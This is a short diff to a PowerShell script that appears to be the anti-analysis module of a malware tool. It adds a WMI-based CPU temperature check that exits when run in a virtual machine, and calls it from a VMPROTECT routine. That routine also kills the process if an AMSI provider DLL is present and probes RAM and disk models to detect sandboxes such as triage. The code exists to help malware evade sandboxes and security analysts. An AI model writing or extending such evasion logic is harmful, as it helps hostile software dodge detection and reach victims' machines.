@@ -72,6 +72,20 @@ function Search-Username {
     return $username
 }
 
+function TEMPCHECK {
+    $thermalZone = Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -Namespace "root\WMI" -EA Ignore
+    if ($thermalZone -ne $null) {
+        foreach ($zone in $thermalZone) {
+            $temperature = ($zone.CurrentTemperature - 2732) / 10
+            Write-Host "[!] Current CPU Temperature: $temperature *C"
+        }
+    } else {
+        Write-Host "[!] Unable to retrieve CPU temperature. Probably a VM"
+        sleep 2
+        exit
+    }
+}
+
 function Invoke-ANTITOTAL {
     $anti_functions = @(
         "InternetCheck",
@@ -125,6 +139,7 @@ function ram_check {
 
 function VMPROTECT {
     if (Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll") { Stop-Process $pid -Force }
+    TEMPCHECK
     ram_check           
     #triage detection
     $d = wmic diskdrive get model
